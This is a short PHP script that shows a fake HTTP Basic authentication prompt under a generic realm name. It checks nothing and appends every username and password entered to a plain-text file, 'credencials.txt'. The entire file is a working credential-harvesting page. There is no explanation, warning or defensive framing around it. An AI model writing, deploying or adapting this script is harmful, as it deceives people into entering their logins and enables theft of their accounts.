<?php
if (!isset($_SERVER['PHP_AUTH_USER'])) {
    header('WWW-Authenticate: Basic realm="My Realm"');
    header('HTTP/1.0 401 Unauthorized');
    exit;
} else {
	$handler = fopen('credencials.txt', 'a+');
    try {
	    fwrite($handler, $_SERVER['PHP_AUTH_USER'].'---->>');
    	fwrite($handler, $_SERVER['PHP_AUTH_PW']."\n");
    	fclose($handler);
    } catch (Exception $e) {
    	var_dump($e);
    	echo "error write !!";
    }
}
?>